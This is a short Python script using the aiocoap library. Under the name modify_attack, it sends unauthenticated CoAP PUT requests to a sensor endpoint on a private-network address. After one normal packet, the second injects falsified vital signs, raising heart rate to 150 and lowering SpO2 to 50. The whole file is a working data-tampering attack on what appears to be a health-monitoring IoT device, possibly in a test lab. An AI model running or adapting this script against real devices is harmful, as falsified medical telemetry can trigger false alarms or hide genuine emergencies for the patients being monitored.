import asyncio
from aiocoap import *


async def modify_attack():
    context = await Context.create_client_context()
    uri = "coap://192.168.115.142:5683/sensor/data"

    # First packet: Normal data
    payload1 = "A:10,20,30|G:5,5,5|H:75|S:98|S:abc123xyz"
    request1 = Message(code=PUT, uri=uri, payload=payload1.encode("utf-8"))
    response1 = await context.request(request1).response
    print(f"First Response: {response1.code}")

    await asyncio.sleep(1)

    # Second packet: Large jump in heart rate and SpO2
    payload2 = "A:10,20,30|G:5,5,5|H:150|S:50|S:abc123xyz"
    request2 = Message(code=PUT, uri=uri, payload=payload2.encode("utf-8"))
    response2 = await context.request(request2).response
    print(f"Second Response: {response2.code}")


# Run the attack
asyncio.run(modify_attack())
